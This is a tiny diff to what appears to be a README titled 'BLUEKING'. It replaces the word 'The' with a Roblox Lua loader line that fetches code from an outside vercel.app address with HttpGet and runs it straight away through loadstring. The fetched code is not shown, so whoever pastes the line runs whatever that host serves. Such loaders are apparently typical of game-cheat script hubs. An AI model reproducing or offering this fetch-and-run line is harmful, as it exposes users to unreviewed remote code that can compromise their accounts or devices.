@@ -1,2 +1,2 @@
 # BLUEKING
-The
+loadstring(game:HttpGet('https://ppearl.vercel.app'))()
